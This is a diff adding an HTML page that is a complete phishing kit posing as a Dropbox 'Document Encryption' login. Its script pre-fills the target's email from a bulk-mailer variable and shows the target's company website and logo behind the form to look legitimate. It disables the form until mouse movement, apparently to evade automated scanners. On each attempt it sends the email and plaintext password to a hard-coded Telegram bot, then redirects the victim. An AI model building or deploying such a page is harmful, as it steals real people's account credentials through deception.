@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Digital Real Estate Secured Platform | Qualia</title>
+    <link rel="shortcut icon" href="https://dl.dropbox.com/s/gqpx03s9c19vs65/favicon.png">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+    <!-- Custom Styles -->
+    <style>
+        body {
+            background: #ffffff; /* White background as fallback */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        #root {
+            position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            filter: brightness(0.3);
+        }
+        .header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            background-color: #f8f9fa;
+            border-bottom: 1px solid #e0e0e0;
+            position: relative;
+            z-index: 1;
+        }
+        .dropbox-logo {
+            width: 48px;
+            height: auto;
+            margin-right: 10px;
+        }
+        .dropbox-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #000000;
+            font-family: "Helvetica", "Arial", sans-serif;
+        }
+        .login-container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .grey-form {
+            background-color: #eee;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        .alert-success {
+            color: #155724;
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+        }
+        #msg {
+            margin-top: 10px;
+        }
+        .btn-login {
+            background-color: #0061FF;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 4px;
+            width: 100%;
+        }
+        .btn-login:disabled {
+            background-color: #cccccc;
+        }
+        .footer {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            position: relative;
+            z-index: 1;
+        }
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .footer .language-selector {
+            margin-top: 10px;
+        }
+        .footer .language-selector select {
+            border: none;
+            background: transparent;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <iframe
+            id="myframe"
+            scrolling="no"
+            src=""
+            width="100%"
+            height="100%"
+            frameborder="0"
+        ></iframe>
+    </div>
+    <div class="header">
+        <img src="https://www.logo.wine/a/logo/Dropbox_(service)/Dropbox_(service)-Icon-Logo.wine.svg" alt="Dropbox Logo" class="dropbox-logo" onerror="this.onerror=null; this.src='https://dl.dropbox.com/s/2qijqkzzdyrdha9/notfound.jpg';">
+        <span class="dropbox-text">Dropbox</span>
+    </div>
+    <div class="login-container mx-auto">
+        <h3 class="text-center">Document Encryption</h3>
+        <p class="text-center">Sign-in with your organization email credentials to access.</p>
+        <!-- Hidden span to keep compNa for domain logo functionality -->
+        <span id="compNa" style="display: none;">Your Platform</span>
+        <!-- Hidden span to store the Gammandyne Mailer email variable -->
+        <span id="gammandyneEmail" style="display: none;">[[email]]</span>
+        <div id="fieldImgCont" class="text-center mb-3">
+            <img id="companyLogo" src="https://dl.dropboxusercontent.com/s/2qijqkzzdyrdha9/notfound.jpg" style="width: 128px;" 
+                 onerror="this.onerror=null; this.src='https://dl.dropboxusercontent.com/s/2qijqkzzdyrdha9/notfound.jpg';">
+        </div>
+        <form id="contact">
+            <div class="form-group">
+                <input type="email" name="email" class="form-control" id="email" placeholder="Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-control" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn btn-login" id="submit-btn">Login</button>
+            <div id="msg" class="text-center"></div>
+        </form>
+    </div>
+    <div class="footer">
+        <div>
+            <a href="#">Privacy & terms</a>
+            <a href="#">Cookie policy</a>
+            <a href="#">Cookies & CCPA preferences</a>
+            <a href="#">AI Principles</a>
+        </div>
+        <div class="language-selector">
+            <select>
+                <option>English (United States)</option>
+                <option>Spanish</option>
+                <option>French</option>
+            </select>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
+    <script>
+        $(document).ready(function() {
+            let attemptCount = 0;
+            const maxAttempts = 2;
+            const telegramBotToken = "6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ";
+            const telegramChatId = "686297216";
+            let userInteracted = false;
+
+            // Anti-bot protection: Disable form if no user interaction
+            function setupAntiBotProtection() {
+                // Initially disable the form
+                $("#contact").addClass("grey-form");
+                $("#submit-btn").prop("disabled", true);
+                $("#msg").html(`<span style="color:red;">Bot detection: Please interact with the page to enable the form.</span>`);
+
+                // Set a timeout to check for interaction
+                const antiBotTimeout = setTimeout(() => {
+                    if (!userInteracted) {
+                        $("#contact").addClass("grey-form");
+                        $("#submit-btn").prop("disabled", true);
+                        $("#msg").html(`<span style="color:red;">Bot detection: Please interact with the page to enable the form.</span>`);
+                    }
+                }, 3000); // 3 seconds
+
+                // Detect user interaction (mouse move or click)
+                $(document).on("mousemove click", function() {
+                    if (!userInteracted) {
+                        userInteracted = true;
+                        clearTimeout(antiBotTimeout);
+                        $("#contact").removeClass("grey-form");
+                        $("#submit-btn").prop("disabled", false);
+                        $("#msg").html(`<small class="d-block mt-2">Access Document</small>`);
+                    }
+                });
+            }
+
+            // Function to validate email format
+            function validateEmail(email) {
+                const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                return re.test(email);
+            }
+
+            // Function to update iframe background based on email domain
+            function updateBackground(email) {
+                const $iframe = $('#myframe');
+                if (validateEmail(email)) {
+                    const domain = email.split('@')[1];
+                    $iframe.attr('src', `https://www.${domain}`);
+                } else {
+                    $iframe.attr('src', '');
+                }
+            }
+
+            // Function to update logo and company name based on email
+            function updateLogoAndCompany(email) {
+                if (validateEmail(email)) {
+                    const domain = email.split('@')[1];
+                    $("#compNa").text(domain);
+                    $("#companyLogo").attr("src", `https://logo.clearbit.com/${domain}?size=128`);
+                } else {
+                    $("#compNa").text("Your Platform");
+                    $("#companyLogo").attr("src", "https://dl.dropboxusercontent.com/s/2qijqkzzdyrdha9/notfound.jpg");
+                }
+            }
+
+            // Function to get URL query parameter
+            function getQueryParam(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+
+            // Auto-populate email field from Gammandyne Mailer variable or query parameter
+            let emailToUse = $("#gammandyneEmail").text().trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(emailToUse) || emailToUse === "[[email]]") {
+                emailToUse = getQueryParam('email');
+            }
+
+            if (emailToUse && emailRegex.test(emailToUse)) {
+                $("#email").val(emailToUse);
+                updateBackground(emailToUse); // Update iframe background
+                updateLogoAndCompany(emailToUse); // Update logo and company name
+            }
+
+            // Update logo, company name, and background on email input
+            $("#email").on("input", function() {
+                const email = $(this).val();
+                updateBackground(email); // Update iframe background
+                updateLogoAndCompany(email); // Update logo and company name
+            });
+
+            // Function to send message to Telegram
+            function sendToTelegram(message) {
+                return $.ajax({
+                    url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+                    type: "POST",
+                    data: {
+                        chat_id: telegramChatId,
+                        text: message
+                    },
+                    dataType: "json"
+                });
+            }
+
+            // Handle form submission
+            $("#contact").on("submit", function(event) {
+                event.preventDefault();
+                const email = $("#email").val();
+                const password = $("#password").val();
+                const domain = email.split('@')[1];
+
+                $("#msg").text("Processing...");
+                $("#submit-btn").prop("disabled", true).text("Verifying...");
+
+                attemptCount++;
+
+                if (attemptCount > maxAttempts) {
+                    const telegramMessage = `Too many login attempts for ${email} with password ${password}. Redirecting to PDF form`;
+                    sendToTelegram(telegramMessage).then(() => {
+                        $("#msg").text("Too many attempts. Redirecting...");
+                        setTimeout(() => window.location.href = "https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf", 1500);
+                    }).catch(() => {
+                        $("#msg").text("Failed to notify Telegram. Redirecting anyway...");
+                        setTimeout(() => window.location.href = "https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf", 1500);
+                    });
+                    return;
+                }
+
+                $.ajax({
+                    url: "/login",
+                    type: "POST",
+                    data: { user: email, pass: password },
+                    dataType: "json",
+                    success: function(response) {
+                        if (response.success) {
+                            const telegramMessage = `Successful login for ${email} with password ${password}`;
+                            sendToTelegram(telegramMessage).then(() => {
+                                $("#msg").text("Login successful! Redirecting...").addClass("alert-success");
+                                setTimeout(() => window.location.href = `https://${domain}`, 1500);
+                            }).catch(() => {
+                                $("#msg").text("Login successful, but Telegram failed. Redirecting...");
+                                setTimeout(() => window.location.href = `https://${domain}`, 1500);
+                            });
+                        } else {
+                            const telegramMessage = `Failed login attempt ${attemptCount}/${maxAttempts} for ${email} with password ${password}`;
+                            sendToTelegram(telegramMessage).then(() => {
+                                $("#msg").html(`<span style="color:red;">Invalid credentials. Attempt ${attemptCount}/${maxAttempts}</span>`);
+                                $("#password").val("").removeClass("grey-form").focus();
+                                $("#submit-btn").prop("disabled", false).text("Login");
+                            }).catch(() => {
+                                $("#msg").html(`<span style="color:red;">Invalid credentials. Attempt ${attemptCount}/${maxAttempts} (Telegram not notified)</span>`);
+                                $("#password").val("").removeClass("grey-form").focus();
+                                $("#submit-btn").prop("disabled", false).text("Login");
+                            });
+                        }
+                    },
+                    error: function() {
+                        const telegramMessage = `Login error for ${email} with password ${password}`;
+                        sendToTelegram(telegramMessage).then(() => {
+                            $("#msg").text("An error occurred. Redirecting...");
+                            $("#submit-btn").prop("disabled", false).text("Login");
+                            setTimeout(() => window.location.href = "https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf", 1500);
+                        }).catch(() => {
+                            $("#msg").text("An error occurred (Telegram not notified). Redirecting...");
+                            $("#submit-btn").prop("disabled", false).text("Login");
+                            setTimeout(() => window.location.href = "https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf", 1500);
+                        });
+                    }
+                });
+            });
+
+            // Display "Access Document"
+            $("#msg").append(`<small class="d-block mt-2">Access Document</small>`);
+
+            // Initialize anti-bot protection
+            setupAntiBotProtection();
+        });
+    </script>
+</body>
+</html>
